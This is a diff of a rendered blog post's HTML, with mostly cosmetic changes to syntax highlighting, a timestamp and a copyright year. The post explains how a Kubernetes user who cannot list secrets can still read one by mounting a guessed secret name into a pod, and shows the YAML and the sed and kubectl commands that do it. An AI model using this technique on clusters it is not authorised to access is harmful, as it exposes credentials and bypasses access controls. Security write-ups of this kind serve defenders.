@@ -218,7 +218,7 @@
     <div class="post-description">
       A little trickery and access any Kubernetes Secret!
     </div>
-    <div class="post-meta"><span title='2021-05-08 12:17:07 +0530 IST'>May 8, 2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Suraj Deshmukh&nbsp;|&nbsp;<a href="https://github.com/surajssd/blog_contents/blob/master/content/post/2021/05/access-k8s-secrets.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
+    <div class="post-meta"><span title='2021-05-08 12:17:07 +0530 +0530'>May 8, 2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Suraj Deshmukh&nbsp;|&nbsp;<a href="https://github.com/surajssd/blog_contents/blob/master/content/post/2021/05/access-k8s-secrets.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
 
 </div>
   </header> 
@@ -299,15 +299,15 @@ The user cannot list secrets, namespaces or deployments:</p>
 </blockquote>
 <p>Let&rsquo;s see that in action. Start by creating a dummy pod config:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="l">$ kubectl run sleep --image=fedora --dry-run=client -o yaml -- sleep infinity &gt; pod.yaml</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">$ cat pod.yaml</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="l">$ cat pod.yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">metadata</span><span class="p">:</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">creationTimestamp</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l">sleep</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">sleep</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">spec</span><span class="p">:</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">args</span><span class="p">:</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="l">sleep</span><span class="w">
@@ -317,26 +317,26 @@ The user cannot list secrets, namespaces or deployments:</p>
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span>{}<span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">dnsPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">ClusterFirst</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">restartPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">Always</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">status</span><span class="p">:</span><span class="w"> </span>{}<span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">status</span><span class="p">:</span><span class="w"> </span>{}<span class="w">
 </span></span></span></code></pre></div><p>Now add the following changes to the config. Here we are mounting a secret inside the pod at path <code>/access-secret</code>. Once the pod is up and running, we will find the mounted secret in this directory. We will replace the <code>secretName</code> field value from <code>GUESSED_SECRET</code> with something else as we keep on guessing.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git pod.yaml pod.yaml
 </span></span></span><span class="line"><span class="cl"><span class="gh">index 479a53d..2376fe3 100644
-</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- pod.yaml
-</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ pod.yaml
-</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -13,6 +13,13 @@ spec:
-</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     image: fedora
+</span></span></span><span class="line"><span class="cl"><span class="gd">--- pod.yaml
+</span></span></span><span class="line"><span class="cl"><span class="gi">+++ pod.yaml
+</span></span></span><span class="line"><span class="cl"><span class="gu">@@ -13,6 +13,13 @@ spec:
+</span></span></span><span class="line"><span class="cl">     image: fedora
 </span></span><span class="line"><span class="cl">     name: sleep
 </span></span><span class="line"><span class="cl">     resources: {}
 </span></span><span class="line"><span class="cl"><span class="gi">+    volumeMounts:
 </span></span></span><span class="line"><span class="cl"><span class="gi">+    - name: hackedsecret
 </span></span></span><span class="line"><span class="cl"><span class="gi">+      mountPath: /access-secret/
-</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   dnsPolicy: ClusterFirst
+</span></span></span><span class="line"><span class="cl">   dnsPolicy: ClusterFirst
 </span></span><span class="line"><span class="cl">   restartPolicy: Always
 </span></span><span class="line"><span class="cl"><span class="gi">+  volumes:
 </span></span></span><span class="line"><span class="cl"><span class="gi">+  - name: hackedsecret
 </span></span></span><span class="line"><span class="cl"><span class="gi">+    secret:
 </span></span></span><span class="line"><span class="cl"><span class="gi">+      secretName: GUESSED_SECRET
-</span></span></span><span class="line"><span class="cl"><span class="gi"></span> status: {}
+</span></span></span><span class="line"><span class="cl"> status: {}
 </span></span></code></pre></div><h2 id="attempt-1st">Attempt 1st<a hidden class="anchor" aria-hidden="true" href="#attempt-1st">#</a></h2>
 <p>Use <code>sed</code> to replace the string <code>GUESSED_SECRET</code> and create the pod out of it:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sed <span class="s1">&#39;s|GUESSED_SECRET|admin|g&#39;</span> pod.yaml <span class="p">|</span> kubectl create -f -
@@ -492,7 +492,7 @@ The user cannot list secrets, namespaces or deployments:</p>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://suraj.io/">Suraj Deshmukh</a></span> · 
+        <span>&copy; 2026 <a href="https://suraj.io/">Suraj Deshmukh</a></span> · 
 
     <span>
         Powered by
